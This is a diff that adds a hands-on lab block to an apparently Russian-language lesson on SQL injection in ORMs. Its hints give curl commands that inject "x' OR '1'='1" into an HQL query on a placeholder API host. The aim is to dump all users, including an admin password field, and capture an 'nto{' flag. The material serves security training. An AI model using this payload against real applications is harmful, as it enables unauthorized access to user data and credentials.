@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "SQL-инъекции в ORM: HQL/JPQL, сырые фрагменты, Hibernate, Prisma raw, обход подготовленных выражений."
+lab:
+  kind: shell
+  title: "Практика: ORM/HQL-инъекция"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Обычный запрос: `curl -s 'https://api.example/users?name=alice'`.
+    - Параметр `name` склеивается в HQL `WHERE u.username = '<name>'`.
+    - Сломай кавычку: `curl -s -G https://api.example/users --data-urlencode "name=x' OR '1'='1"`.
+    - Ответ вернёт всех, включая `admin` с полем `password` — забери флаг: `... | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 ## Задача
